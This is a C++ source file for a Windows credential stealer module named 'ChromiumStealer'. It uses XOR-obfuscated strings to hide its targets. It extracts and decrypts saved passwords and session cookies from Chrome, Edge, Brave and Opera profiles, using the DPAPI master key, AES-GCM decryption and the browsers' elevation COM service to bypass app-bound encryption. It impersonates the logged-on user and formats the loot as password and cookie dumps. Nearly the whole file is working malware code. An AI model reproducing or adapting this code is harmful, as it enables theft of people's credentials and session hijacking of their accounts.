#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <wincrypt.h>

#include "ChromiumStealer.h"
#include "../crypto/Base64.h"
#include "../crypto/AesGcm.h"
#include "../utils/Logger.h"
#include "../utils/Obfuscator.h"
#include "../utils/Shared.h"
#include <nlohmann/json.hpp>
#include <sqlite3.h>
#include <objbase.h>

#pragma comment(lib, "crypt32.lib")

namespace credential {

    namespace fs = std::filesystem;

    namespace {
        // IElevator interface definition (v20 decryption)
        MIDL_INTERFACE("10915CE0-653E-4B02-8610-86B5A6112A0A")
        IElevator : public IUnknown {
        public:
            virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRX(const wchar_t*, const wchar_t*, const wchar_t*, const wchar_t*, DWORD, ULONG_PTR*) = 0;
            virtual HRESULT STDMETHODCALLTYPE DecryptData(const unsigned char* ciphertext, uint32_t ciphertext_size, wchar_t** plaintext) = 0;
        };

        // XOR Encrypted Strings (Multi-byte Key: 0x4B, 0x1F, 0x8C, 0x3E)
        const wchar_t kOsCryptEnc[] = { L'\x24', L'\x6c', L'\xd3', L'\x5d', L'\x39', L'\x66', L'\xfc', L'\x4a', L'\0' };
        const wchar_t kEncryptedKeyEnc[] = { L'\x2e', L'\x71', L'\xef', L'\x4c', L'\x32', L'\x6f', L'\xf8', L'\x5b', L'\x2f', L'\x40', L'\xe7', L'\x5b', L'\x32', L'\0' };
        const wchar_t kLocalStateEnc[] = { L'\x07', L'\x70', L'\xef', L'\x5f', L'\x27', L'\x3f', L'\xdf', L'\x4a', L'\x2a', L'\x6b', L'\xe9', L'\0' }; // Local State
        const wchar_t kLoginDataEnc[] = { L'\x07', L'\x70', L'\xeb', L'\x57', L'\x25', L'\x3f', L'\xc8', L'\x5f', L'\x3f', L'\x7e', L'\0' }; // Login Data
        const wchar_t kCookiesEnc[] = { L'\x08', L'\x70', L'\xe3', L'\x55', L'\x22', L'\x7a', L'\xff', L'\0' }; // Cookies

        const wchar_t kDefaultEnc[] = { L'\x0f', L'\x7a', L'\xea', L'\x5f', L'\x3e', L'\x73', L'\xf8', L'\0' }; // Default
        const wchar_t kNetworkEnc[] = { L'\x05', L'\x7a', L'\xf8', L'\x49', L'\x24', L'\x6d', L'\xe7', L'\0' }; // Network
        const wchar_t kProfilePrefixEnc[] = { L'\x1b', L'\x6d', L'\xe3', L'\x58', L'\x22', L'\x73', L'\xe9', L'\x1e', L'\0' }; // Profile

        const wchar_t kQueryLoginsEnc[] = { L'\x18', L'\x5a', L'\xc0', L'\x7b', L'\x08', L'\x4b', L'\xac', L'\x51', L'\x39', L'\x76', L'\xeb', L'\x57', L'\x25', L'\x40', L'\xf9', L'\x4c', L'\x27', L'\x33', L'\xac', L'\x4b', L'\x38', L'\x7a', L'\xfe', L'\x50', L'\x2a', L'\x72', L'\xe9', L'\x61', L'\x3d', L'\x7e', L'\xe0', L'\x4b', L'\x2e', L'\x33', L'\xac', L'\x4e', L'\x2a', L'\x6c', L'\xff', L'\x49', L'\x24', L'\x6d', L'\xe8', L'\x61', L'\x3d', L'\x7e', L'\xe0', L'\x4b', L'\x2e', L'\x3f', L'\xca', L'\x6c', L'\x04', L'\x52', L'\xac', L'\x52', L'\x24', L'\x78', L'\xe5', L'\x50', L'\x38', L'\0' };
        const wchar_t kQueryCookiesEnc[] = { L'\x18', L'\x5a', L'\xc0', L'\x7b', L'\x08', L'\x4b', L'\xac', L'\x56', L'\x24', L'\x6c', L'\xf8', L'\x61', L'\x20', L'\x7a', L'\xf5', L'\x12', L'\x6b', L'\x71', L'\xed', L'\x53', L'\x2e', L'\x33', L'\xac', L'\x4e', L'\x2a', L'\x6b', L'\xe4', L'\x12', L'\x6b', L'\x7a', L'\xe2', L'\x5d', L'\x39', L'\x66', L'\xfc', L'\x4a', L'\x2e', L'\x7b', L'\xd3', L'\x48', L'\x2a', L'\x73', L'\xf9', L'\x5b', L'\x67', L'\x3f', L'\xe9', L'\x46', L'\x3b', L'\x76', L'\xfe', L'\x5b', L'\x38', L'\x40', L'\xf9', L'\x4a', L'\x28', L'\x3f', L'\xca', L'\x6c', L'\x04', L'\x52', L'\xac', L'\x5d', L'\x24', L'\x70', L'\xe7', L'\x57', L'\x2e', L'\x6c', L'\0' };

        // Browser paths
        const wchar_t kChromePathEnc[] = { L'\x17', L'\x58', L'\xe3', L'\x51', L'\x2c', L'\x73', L'\xe9', L'\x62', L'\x08', L'\x77', L'\xfe', L'\x51', L'\x26', L'\x7a', L'\xd0', L'\x6b', L'\x38', L'\x7a', L'\xfe', L'\x1e', L'\x0f', L'\x7e', L'\xf8', L'\x5f', L'\0' };
        const wchar_t kEdgePathEnc[] = { L'\x17', L'\x52', L'\xe5', L'\x5d', L'\x39', L'\x70', L'\xff', L'\x51', L'\x2d', L'\x6b', L'\xd0', L'\x7b', L'\x2f', L'\x78', L'\xe9', L'\x62', L'\x1e', L'\x6c', L'\xe9', L'\x4c', L'\x6b', L'\x5b', L'\xed', L'\x4a', L'\x2a', L'\0' };
        const wchar_t kBravePathEnc[] = { L'\x17', L'\x5d', L'\xfe', L'\x5f', L'\x3d', L'\x7a', L'\xdf', L'\x51', L'\x2d', L'\x6b', L'\xfb', L'\x5f', L'\x39', L'\x7a', L'\xd0', L'\x7c', L'\x39', L'\x7e', L'\xfa', L'\x5b', L'\x66', L'\x5d', L'\xfe', L'\x51', L'\x3c', L'\x6c', L'\xe9', L'\x4c', L'\x17', L'\x4a', L'\xff', L'\x5b', L'\x39', L'\x3f', L'\xc8', L'\x5f', L'\x3f', L'\x7e', L'\0' };
        const wchar_t kOperaPathEnc[] = { L'\x17', L'\x50', L'\xfc', L'\x5b', L'\x39', L'\x7e', L'\xac', L'\x6d', L'\x24', L'\x79', L'\xf8', L'\x49', L'\x2a', L'\x6d', L'\xe9', L'\x62', L'\x04', L'\x6f', L'\xe9', L'\x4c', L'\x2a', L'\x3f', L'\xdf', L'\x4a', L'\x2a', L'\x7d', L'\xe0', L'\x5b', L'\0' };
        const wchar_t kOperaGxPathEnc[] = { L'\x17', L'\x50', L'\xfc', L'\x5b', L'\x39', L'\x7e', L'\xac', L'\x6d', L'\x24', L'\x79', L'\xf8', L'\x49', L'\x2a', L'\x6d', L'\xe9', L'\x62', L'\x04', L'\x6f', L'\xe9', L'\x4c', L'\x2a', L'\x3f', L'\xcb', L'\x66', L'\x6b', L'\x4c', L'\xf8', L'\x5f', L'\x29', L'\x73', L'\xe9', L'\0' };

        const wchar_t kChromeClsidEnc[] = { L'\x7c', L'\x2f', L'\xb4', L'\x06', L'\x7d', L'\x2f', L'\xbf', L'\x0e', L'\x66', L'\x7e', L'\xe8', L'\x07', L'\x2a', L'\x32', L'\xb8', L'\x5d', L'\x7e', L'\x2c', L'\xa1', L'\x07', L'\x79', L'\x29', L'\xbe', L'\x13', L'\x2e', L'\x2e', L'\xe8', L'\x0b', L'\x79', L'\x7b', L'\xb5', L'\x5f', L'\x7f', L'\x2d', L'\xea', L'\x06', L'\0' };
        const wchar_t kEdgeClsidEnc[] = { L'\x7a', L'\x2c', L'\xc9', L'\x0c', L'\x79', L'\x5b', L'\xcf', L'\x0d', L'\x66', L'\x2f', L'\xbe', L'\x0e', L'\x0a', L'\x32', L'\xb8', L'\x08', L'\x0e', L'\x2f', L'\xa1', L'\x7c', L'\x7c', L'\x28', L'\xb4', L'\x13', L'\x7f', L'\x5b', L'\xbc', L'\x07', L'\x7b', L'\x28', L'\xcd', L'\x06', L'\x0a', L'\x2c', L'\xbf', L'\x7a', L'\0' };
        const wchar_t kIElevatorIidEnc[] = { L'\x7a', L'\x2f', L'\xb5', L'\x0f', L'\x7e', L'\x5c', L'\xc9', L'\x0e', L'\x66', L'\x29', L'\xb9', L'\x0d', L'\x0e', L'\x32', L'\xb8', L'\x7c', L'\x7b', L'\x2d', L'\xa1', L'\x06', L'\x7d', L'\x2e', L'\xbc', L'\x13', L'\x73', L'\x29', L'\xce', L'\x0b', L'\x0a', L'\x29', L'\xbd', L'\x0f', L'\x79', L'\x5e', L'\xbc', L'\x7f', L'\0' };

        std::string DecryptAppBound(const std::vector<BYTE>& ciphertext, const std::string& browserName) {
            CLSID clsid;
            HRESULT hr;
            std::wstring clsidStr;
            if (browserName.find("Chrome") != std::string::npos) {
                clsidStr = utils::DecryptW(kChromeClsidEnc, wcslen(kChromeClsidEnc));
            } else if (browserName.find("Edge") != std::string::npos) {
                clsidStr = utils::DecryptW(kEdgeClsidEnc, wcslen(kEdgeClsidEnc));
            } else {
                return "[v20 encrypted - " + browserName + "]";
            }

            hr = CLSIDFromString(clsidStr.c_str(), &clsid);
            if (FAILED(hr)) return "[v20 CLSID fail]";

            IID iid;
            hr = IIDFromString(utils::DecryptW(kIElevatorIidEnc, wcslen(kIElevatorIidEnc)).c_str(), &iid);
            if (FAILED(hr)) return "[v20 IID fail]";

            IElevator* pElevator = NULL;
            // No CoInitialize here as it's done in TaskDispatcher
            hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, iid, (void**)&pElevator);
            if (SUCCEEDED(hr) && pElevator) {
                wchar_t* plaintext = NULL;
                // v20 DecryptData usually expects the exact same byte array found in SQLite
                hr = pElevator->DecryptData(ciphertext.data(), (uint32_t)ciphertext.size(), &plaintext);
                if (SUCCEEDED(hr) && plaintext) {
                    std::string result = utils::ws2s(plaintext);
                    CoTaskMemFree(plaintext);
                    pElevator->Release();
                    return result;
                }
                pElevator->Release();
                return "[v20 DecryptData fail - HRESULT " + utils::Shared::ToHex(hr) + "]";
            }
            return "[v20 Elevation Service fail - HRESULT " + utils::Shared::ToHex(hr) + "]";
        }

        void SafeCopyDatabase(const std::string& src, const std::string& dest) {
            try {
                if (!fs::exists(src)) return;
                fs::copy_file(src, dest, fs::copy_options::overwrite_existing);
                if (fs::exists(src + "-wal")) fs::copy_file(src + "-wal", dest + "-wal", fs::copy_options::overwrite_existing);
                if (fs::exists(src + "-shm")) fs::copy_file(src + "-shm", dest + "-shm", fs::copy_options::overwrite_existing);
            } catch (...) {
                CopyFileA(src.c_str(), dest.c_str(), FALSE);
                std::string wal = src + "-wal";
                if (fs::exists(wal)) CopyFileA(wal.c_str(), (dest + "-wal").c_str(), FALSE);
                std::string shm = src + "-shm";
                if (fs::exists(shm)) CopyFileA(shm.c_str(), (dest + "-shm").c_str(), FALSE);
            }
        }

        void SafeDeleteDatabase(const std::string& path) {
            try {
                fs::remove(path);
                fs::remove(path + "-wal");
                fs::remove(path + "-shm");
            } catch (...) {}
        }

        std::vector<BYTE> GetMasterKey(const std::string& localStatePath) {
            try {
                if (!fs::exists(localStatePath)) {
                    LOG_DEBUG("[!] Local State path does not exist: " + localStatePath);
                    return {};
                }

                std::ifstream f(localStatePath);
                if (!f.is_open()) {
                    LOG_DEBUG("[!] Failed to open Local State: " + localStatePath);
                    return {};
                }

                nlohmann::json j;
                f >> j;
                f.close();

                std::string os_crypt = utils::ws2s(utils::DecryptW(kOsCryptEnc, wcslen(kOsCryptEnc)));
                std::string encrypted_key_str = utils::ws2s(utils::DecryptW(kEncryptedKeyEnc, wcslen(kEncryptedKeyEnc)));

                if (!j.contains(os_crypt) || !j[os_crypt].contains(encrypted_key_str)) {
                    LOG_DEBUG("[!] JSON missing 'os_crypt' or 'encrypted_key' fields.");
                    return {};
                }

                std::string encryptedKeyB64 = j[os_crypt][encrypted_key_str];
                std::vector<BYTE> decodedKey = crypto::Base64Decode(encryptedKeyB64);

                if (decodedKey.size() < 5) {
                    LOG_DEBUG("[!] Decoded key too short.");
                    return {};
                }

                // Remove "DPAPI" prefix (The first 5 bytes are 'DPAPI')
                std::vector<BYTE> dpapiPayload(decodedKey.begin() + 5, decodedKey.end());

                DATA_BLOB in, out;
                in.pbData = dpapiPayload.data();
                in.cbData = (DWORD)dpapiPayload.size();

                if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                    std::vector<BYTE> masterKey(out.pbData, out.pbData + out.cbData);
                    LocalFree(out.pbData);
                    LOG_DEBUG("[+] SUCCESS: Master Key retrieved for " + localStatePath);
                    return masterKey;
                } else {
                    LOG_DEBUG("[!] CryptUnprotectData failed. Error: " + std::to_string(GetLastError()));
                }
            } catch (const std::exception& e) {
                LOG_DEBUG("[!] Exception in GetMasterKey: " + std::string(e.what()));
            }
            return {};
        }

        std::string DecryptPassword(const std::vector<BYTE>& ciphertext, const std::vector<BYTE>& masterKey, const std::string& browserName) {
            if (ciphertext.empty()) return "";

            // Modern Chromium: v10/v11 (AES-GCM)
            if (ciphertext.size() >= 15 && ciphertext[0] == 'v' && ciphertext[1] == '1') {
                try {
                    if (masterKey.empty()) return "";
                    std::vector<BYTE> iv(ciphertext.begin() + 3, ciphertext.begin() + 15);
                    std::vector<BYTE> payload(ciphertext.begin() + 15, ciphertext.end());
                    crypto::AesGcm aes(masterKey);
                    std::vector<BYTE> decrypted = aes.decrypt(payload, iv);
                    return std::string(decrypted.begin(), decrypted.end());
                } catch (...) { return ""; }
            }

            // v20 (App-Bound Encryption) - Not decryptable with master key alone
            if (ciphertext.size() >= 2 && ciphertext[0] == 'v' && ciphertext[1] == '2') {
                return DecryptAppBound(ciphertext, browserName);
            }

            // Legacy Chromium: DPAPI
            DATA_BLOB in, out;
            in.pbData = (BYTE*)ciphertext.data();
            in.cbData = (DWORD)ciphertext.size();
            if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
                std::string decrypted((char*)out.pbData, out.cbData);
                LocalFree(out.pbData);
                return decrypted;
            }

            return "";
        }
    }

    std::string DumpChromiumPasswords() {
        bool impersonated = utils::ImpersonateLoggedOnUser();
        std::string report = "CHROMIUM_PASSWORDS_DUMPED:\n";
        if (impersonated) report += "[+] Running with impersonated user token.\n";

        report += "BROWSER | PROFILE | URL | USERNAME | PASSWORD\n";
        report += "--------------------------------------------------------------------------------\n";

        char path[MAX_PATH];
        std::string localAppData = "";
        std::string roamingAppData = "";

        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) localAppData = path;
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) roamingAppData = path;

        struct BrowserPath {
            std::string name;
            std::string localPath;
            std::string roamingPath;
        };

        std::vector<BrowserPath> browsers = {
            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(kChromePathEnc, wcslen(kChromePathEnc))), ""},
            {"Edge", localAppData + utils::ws2s(utils::DecryptW(kEdgePathEnc, wcslen(kEdgePathEnc))), ""},
            {"Brave", localAppData + utils::ws2s(utils::DecryptW(kBravePathEnc, wcslen(kBravePathEnc))), ""},
            {"Opera", localAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, wcslen(kOperaPathEnc))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, wcslen(kOperaPathEnc)))},
            {"Opera GX", localAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, wcslen(kOperaGxPathEnc))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, wcslen(kOperaGxPathEnc)))}
        };

        for (const auto& browser : browsers) {
            std::string localStateDir = browser.localPath;
            if (localStateDir.empty() || !fs::exists(localStateDir)) localStateDir = browser.roamingPath;
            if (localStateDir.empty() || !fs::exists(localStateDir)) {
                LOG_DEBUG("No user data path found for browser: " + browser.name);
                continue;
            }

            std::string localState = localStateDir + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, wcslen(kLocalStateEnc)));
            std::vector<BYTE> key = GetMasterKey(localState);

            std::vector<std::string> searchPaths;
            if (!browser.roamingPath.empty() && fs::exists(browser.roamingPath)) searchPaths.push_back(browser.roamingPath);
            if (!browser.localPath.empty() && browser.localPath != browser.roamingPath && fs::exists(browser.localPath)) searchPaths.push_back(browser.localPath);

            for (const auto& searchPath : searchPaths) {
                std::vector<std::string> profiles;
                if (fs::exists(searchPath + "\\" + utils::ws2s(utils::DecryptW(kLoginDataEnc, wcslen(kLoginDataEnc))))) {
                    profiles.push_back("");
                }
                std::string dName = utils::ws2s(utils::DecryptW(kDefaultEnc, wcslen(kDefaultEnc)));
                if (fs::exists(searchPath + "\\" + dName)) {
                    profiles.push_back(dName);
                }

                try {
                    for (const auto& entry : fs::directory_iterator(searchPath)) {
                        if (entry.is_directory()) {
                            std::string name = entry.path().filename().string();
                            std::string prefix = utils::ws2s(utils::DecryptW(kProfilePrefixEnc, wcslen(kProfilePrefixEnc)));
                            if (name.find(prefix) == 0 && name != dName) profiles.push_back(name);
                        }
                    }
                } catch (...) {}

                for (const auto& profile : profiles) {
                    std::string profilePath = profile.empty() ? searchPath : (searchPath + "\\" + profile);
                    std::string loginData = profilePath + "\\" + utils::ws2s(utils::DecryptW(kLoginDataEnc, wcslen(kLoginDataEnc)));

                    if (!fs::exists(loginData)) continue;

                char tempPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tempPath);
                std::string tempDb = std::string(tempPath) + "ld_" + std::to_string(GetTickCount64());
                SafeCopyDatabase(loginData, tempDb);

                sqlite3* db;
                if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                    std::string query_str = utils::ws2s(utils::DecryptW(kQueryLoginsEnc, wcslen(kQueryLoginsEnc)));
                    sqlite3_stmt* stmt;
                    if (sqlite3_prepare_v2(db, query_str.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
                        while (sqlite3_step(stmt) == SQLITE_ROW) {
                            const char* url = (const char*)sqlite3_column_text(stmt, 0);
                            const char* user = (const char*)sqlite3_column_text(stmt, 1);
                            const void* blob = sqlite3_column_blob(stmt, 2);
                            int blobLen = sqlite3_column_bytes(stmt, 2);

                            if (url && user && blobLen > 0) {
                                std::vector<BYTE> encrypted((BYTE*)blob, (BYTE*)blob + blobLen);
                                std::string pass = DecryptPassword(encrypted, key, browser.name);
                                if (!pass.empty()) {
                                    report += browser.name + " | " + profile + " | " + url + " | " + user + " | " + pass + "\n";
                                }
                            }
                        }
                        sqlite3_finalize(stmt);
                    }
                    sqlite3_close(db);
                }
                SafeDeleteDatabase(tempDb);
            }
        }

        if (impersonated) utils::RevertToSelf();
        return report;
    }

    std::string StealChromiumCookies() {
        bool impersonated = utils::ImpersonateLoggedOnUser();
        std::stringstream ss;
        ss << "# CHROMIUM COOKIE STEALER RESULTS\n";
        if (impersonated) ss << "# [+] Running with impersonated user token.\n";
        int count = 0;

        char path[MAX_PATH];
        std::string localAppData = "";
        std::string roamingAppData = "";

        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) localAppData = path;
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path))) roamingAppData = path;

        struct BrowserPath {
            std::string name;
            std::string localPath;
            std::string roamingPath;
        };

        std::vector<BrowserPath> browsers = {
            {"Chrome", localAppData + utils::ws2s(utils::DecryptW(kChromePathEnc, wcslen(kChromePathEnc))), ""},
            {"Edge", localAppData + utils::ws2s(utils::DecryptW(kEdgePathEnc, wcslen(kEdgePathEnc))), ""},
            {"Brave", localAppData + utils::ws2s(utils::DecryptW(kBravePathEnc, wcslen(kBravePathEnc))), ""},
            {"Opera", localAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, wcslen(kOperaPathEnc))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaPathEnc, wcslen(kOperaPathEnc)))},
            {"Opera GX", localAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, wcslen(kOperaGxPathEnc))), roamingAppData + utils::ws2s(utils::DecryptW(kOperaGxPathEnc, wcslen(kOperaGxPathEnc)))}
        };

        for (const auto& browser : browsers) {
            std::string localStateDir = browser.localPath;
            if (localStateDir.empty() || !fs::exists(localStateDir)) localStateDir = browser.roamingPath;
            if (localStateDir.empty() || !fs::exists(localStateDir)) continue;

            std::string localState = localStateDir + "\\" + utils::ws2s(utils::DecryptW(kLocalStateEnc, wcslen(kLocalStateEnc)));
            std::vector<BYTE> key = GetMasterKey(localState);

            std::vector<std::string> searchPaths;
            if (!browser.roamingPath.empty() && fs::exists(browser.roamingPath)) searchPaths.push_back(browser.roamingPath);
            if (!browser.localPath.empty() && browser.localPath != browser.roamingPath && fs::exists(browser.localPath)) searchPaths.push_back(browser.localPath);

            for (const auto& searchPath : searchPaths) {
                std::vector<std::string> profiles;
                std::string dName = utils::ws2s(utils::DecryptW(kDefaultEnc, wcslen(kDefaultEnc)));
                if (fs::exists(searchPath + "\\" + dName)) {
                    profiles.push_back(dName);
                }
                // Check for root profile cookies if Default doesn't exist or just anyway
                std::string networkName = utils::ws2s(utils::DecryptW(kNetworkEnc, wcslen(kNetworkEnc)));
                std::string cookiesName = utils::ws2s(utils::DecryptW(kCookiesEnc, wcslen(kCookiesEnc)));
                if (fs::exists(searchPath + "\\" + networkName + "\\" + cookiesName) ||
                    fs::exists(searchPath + "\\" + cookiesName)) {
                    profiles.push_back("");
                }

                try {
                    for (const auto& entry : fs::directory_iterator(searchPath)) {
                        if (entry.is_directory()) {
                            std::string name = entry.path().filename().string();
                            std::string prefix = utils::ws2s(utils::DecryptW(kProfilePrefixEnc, wcslen(kProfilePrefixEnc)));
                            if (name.find(prefix) == 0 && name != dName) profiles.push_back(name);
                        }
                    }
                } catch (...) {}

                for (const auto& profile : profiles) {
                    std::string profileBase = profile.empty() ? searchPath : (searchPath + "\\" + profile);

                    // Modern path: \Network\Cookies, Legacy: \Cookies
                std::string cookiesPath = profileBase + "\\" + utils::ws2s(utils::DecryptW(kNetworkEnc, wcslen(kNetworkEnc))) + "\\" + utils::ws2s(utils::DecryptW(kCookiesEnc, wcslen(kCookiesEnc)));
                if (!fs::exists(cookiesPath)) {
                    cookiesPath = profileBase + "\\" + utils::ws2s(utils::DecryptW(kCookiesEnc, wcslen(kCookiesEnc)));
                }

                if (!fs::exists(cookiesPath)) continue;

                char tempPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tempPath);
                std::string tempDb = std::string(tempPath) + "ck_" + std::to_string(GetTickCount64());
                SafeCopyDatabase(cookiesPath, tempDb);

                sqlite3* db;
                if (sqlite3_open_v2(tempDb.c_str(), &db, SQLITE_OPEN_READONLY, NULL) == SQLITE_OK) {
                    std::string query_str = utils::ws2s(utils::DecryptW(kQueryCookiesEnc, wcslen(kQueryCookiesEnc)));
                    sqlite3_stmt* stmt;
                    if (sqlite3_prepare_v2(db, query_str.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
                        while (sqlite3_step(stmt) == SQLITE_ROW) {
                            const char* host = (const char*)sqlite3_column_text(stmt, 0);
                            const char* name = (const char*)sqlite3_column_text(stmt, 1);
                            const char* cpath = (const char*)sqlite3_column_text(stmt, 2);
                            const void* blob = sqlite3_column_blob(stmt, 3);
                            int blobLen = sqlite3_column_bytes(stmt, 3);
                            sqlite3_int64 expiry = sqlite3_column_int64(stmt, 4);

                            if (host && name && cpath && blobLen > 0) {
                                std::vector<BYTE> encrypted((BYTE*)blob, (BYTE*)blob + blobLen);
                                std::string val = DecryptPassword(encrypted, key, browser.name);
                                if (!val.empty()) {
                                    ss << host << "\t" << ((host[0] == '.') ? "TRUE" : "FALSE") << "\t" << cpath << "\t" << "TRUE\t" << expiry << "\t" << name << "\t" << val << "\n";
                                    count++;
                                }
                            }
                        }
                        sqlite3_finalize(stmt);
                    }
                    sqlite3_close(db);
                }
                SafeDeleteDatabase(tempDb);
            }
        }

        if (impersonated) utils::RevertToSelf();
        std::stringstream finalSS;
        finalSS << "# Total cookies: " << count << "\n" << ss.str();
        return finalSS.str();
    }
}
